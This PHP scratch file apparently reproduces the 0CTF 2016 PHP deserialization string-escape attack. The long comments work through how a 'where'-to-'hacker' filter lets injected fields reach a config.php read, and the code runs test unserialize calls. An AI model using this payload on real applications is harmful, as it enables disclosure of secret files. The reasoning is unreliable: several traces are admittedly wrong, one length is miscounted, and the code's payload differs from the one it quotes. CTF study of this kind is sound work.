<?php
// Let me re-read the 0CTF 2016 writeup more carefully.
// 
// The key insight: the filter EXPANDS the string (where->hacker, 5->6 chars).
// 
// Original: s:170:"wherewhere...PAYLOAD";
// After filter: s:170:"hackerhacker...PAYLOAD";
// 
// The serialized length says 170 bytes, but the actual string is longer!
// PHP reads 170 bytes and STOPS, leaving the extra bytes as the next serialized element!
// 
// For example:
// Original: s:5:"where"
// After filter: s:5:"hacker" (6 bytes)
// PHP reads 5 bytes: "hacke"
// PHP expects "; (closing quote and semicolon)
// Next char: r
// Expected ", got r
// Error!

// Wait, that doesn't work either. Let me think about this more carefully.

// Actually, I think the key is:
// The filter EXPANDS the CONTENT, but the serialized length stays the same.
// 
// Original: s:5:"where"
// After filter: s:5:"hacker"
// 
// PHP reads 5 bytes: "hacke"
// CONTENT = "hacke"
// Then PHP expects "; (closing quote and semicolon)
// Next char: r
// Expected ", got r
// Error!

// So EXPANSION also causes an error!

// Let me re-read the writeup again...
// 
// "The serialized length field says N bytes, but after expansion the actual string is longer,
// causing the PHP deserializer to read past the intended boundary and parse attacker-controlled
// data as serialized fields."
// 
// Hmm, "read past the intended boundary" - this sounds like PHP reads PAST the closing quote!
// 
// Let me trace through:
// Original: s:5:"where"
// After filter: s:5:"hacker"
// 
// PHP reads 5 bytes from position after opening quote.
// Position after opening quote: h
// PHP reads: h, a, c, k, e (5 bytes)
// CONTENT = "hacke"
// Then PHP expects "; (closing quote and semicolon)
// Next char: r
// Expected ", got r
// Error!

// So PHP reads 5 bytes and expects ";, but the next char is "r", not "!

// The trick must be different. Let me re-read the writeup one more time...

// Actually, I think the key is in the PAYLOAD!
// 
// The writeup says:
// "$payload = '";}s:5:"photo";s:10:"config.php";}';"
// "$_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;"
// 
// So the payload includes: ";}s:5:"photo";s:10:"config.php";}
// 
// And the nickname is: "where" * strlen(payload) + payload
// 
// Let me trace through:
// payload = ";}s:5:"photo";s:10:"config.php";}" (35 bytes)
// nickname = "where" * 35 + payload = "wherewhere...where" + ";}s:5:"photo";s:10:"config.php";}"
// 
// Original serialized: s:175:"wherewhere...where";}s:5:"photo";s:10:"config.php";}"
// After filter: s:175:"hackerhacker...hacker";}s:5:"photo";s:10:"config.php";}"
// 
// Each "where" (5 bytes) becomes "hacker" (6 bytes), adding 1 byte per occurrence.
// 35 occurrences add 35 bytes.
// 
// So the actual string is 175 + 35 = 210 bytes.
// But the serialized length says 175 bytes!
// 
// PHP reads 175 bytes from the 210-byte string.
// PHP reads: "hackerhacker...hacker";}s:5:"photo";s:10:"config (175 bytes)
// CONTENT = "hackerhacker...hacker";}s:5:"photo";s:10:"config"
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: . (from ".php")
// Expected ", got .
// Error!

// Hmm, this still doesn't work. Let me think about this differently.

// Actually, I think the key is that the payload includes ";} which closes the current element
// and the array!
// 
// Let me trace through more carefully:
// 
// Original serialized (for an array): a:1:{s:8:"nickname";s:175:"wherewhere...where";}s:5:"photo";s:10:"config.php";}";}
// 
// After filter: a:1:{s:8:"nickname";s:175:"hackerhacker...hacker";}s:5:"photo";s:10:"config.php";}";}
// 
// PHP parses:
// a:1:{ - array with 1 element
// s:8:"nickname" - key
// s:175:" - value is string of length 175
//   PHP reads 175 bytes from position after opening quote
//   Position after opening quote: h
//   PHP reads: hackerhacker...hacker";}s:5:"photo";s:10:"config (175 bytes)
//   CONTENT = "hackerhacker...hacker";}s:5:"photo";s:10:"config"
//   
//   Then PHP expects "; (closing quote and semicolon)
//   Next char: . (from ".php")
//   Expected ", got .
//   Error!

// This still doesn't work! I'm clearly missing something.

// Let me look at the writeup example more carefully.
// 
// The writeup says:
// "$payload = '";}s:5:"photo";s:10:"config.php";}';"
// 
// Note the ";} at the beginning! This closes the current string value and the array!
// 
// So the structure is:
// a:1:{s:8:"nickname";s:175:"...PAYLOAD";}
// 
// Where PAYLOAD starts with ";} which closes the nickname value and the array!
// 
// But wait, if PAYLOAD closes the array, then the remaining content would be parsed
// as extra data, which PHP would ignore!

// Let me test this:
$test = 'a:1:{s:8:"nickname";s:5:"test";}extra';
echo "Test: $test\n";
$result = @unserialize($test);
var_dump($result);
echo "\n";

// Test with injected content
$test2 = 'a:1:{s:8:"nickname";s:15:"test";}s:5:"photo";s:10:"config.php";}";}';
echo "Test 2: $test2\n";
$result2 = @unserialize($test2);
var_dump($result2);
echo "\n";

// Hmm, the array count is 1, but we're trying to inject a second element.
// Let me test with array count 2:
$test3 = 'a:2:{s:8:"nickname";s:4:"test";s:5:"photo";s:10:"config.php";}';
echo "Test 3: $test3\n";
$result3 = @unserialize($test3);
var_dump($result3);
echo "\n";

// Now let me test the escape:
// Original: a:1:{s:8:"nickname";s:175:"wherewhere...PAYLOAD";}
// After filter: a:1:{s:8:"nickname";s:175:"hackerhacker...PAYLOAD";}
// 
// If PAYLOAD = ";}s:5:"photo";s:10:"config.php";}
// 
// Then after filter:
// a:1:{s:8:"nickname";s:175:"hackerhacker...hacker";}s:5:"photo";s:10:"config.php";}";}
// 
// PHP reads 175 bytes from the expanded string.
// The expanded string is: "hackerhacker...hacker";}s:5:"photo";s:10:"config.php";}";}
// 
// Let's say we have 35 "where"s, each becoming "hacker" (6 bytes).
// 35 * 6 = 210 bytes for the "hacker" part.
// Plus the payload: ";}s:5:"photo";s:10:"config.php";} (35 bytes)
// Total: 210 + 35 = 245 bytes.
// 
// But the serialized length says 175 bytes!
// 
// PHP reads 175 bytes from the 245-byte string.
// 
// Hmm, 175 is less than 210 (the "hacker" part), so PHP reads only "hacker"s.
// 
// Let me calculate:
// 175 / 6 = 29.17, so PHP reads 29 "hacker"s (174 bytes) + 1 more byte.
// 29 * 6 = 174 bytes.
// 
// PHP reads 175 bytes: "hacker" * 29 + "h" (175 bytes)
// CONTENT = "hackerhacker...hackerh"
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: a (from "acker")
// Expected ", got a
// Error!

// This still doesn't work! I'm clearly misunderstanding something.

// Let me try a different approach: just test the actual exploit from the writeup.

// Simulate the 0CTF 2016 scenario
$payload = ';}s:5:"photo";s:10:"config.php";}';
$nickname = str_repeat("where", strlen($payload)) . $payload;

echo "Payload: $payload\n";
echo "Payload length: " . strlen($payload) . "\n";
echo "Nickname: " . $nickname . "\n";
echo "Nickname length: " . strlen($nickname) . "\n\n";

// Simulate the filter
function filter_0ctf($img){
    return preg_replace('/where/', 'hacker', $img);
}

// Simulate the serialization
$_SESSION = [];
$_SESSION['nickname'] = $nickname;

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter_0ctf($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);
echo "\n";

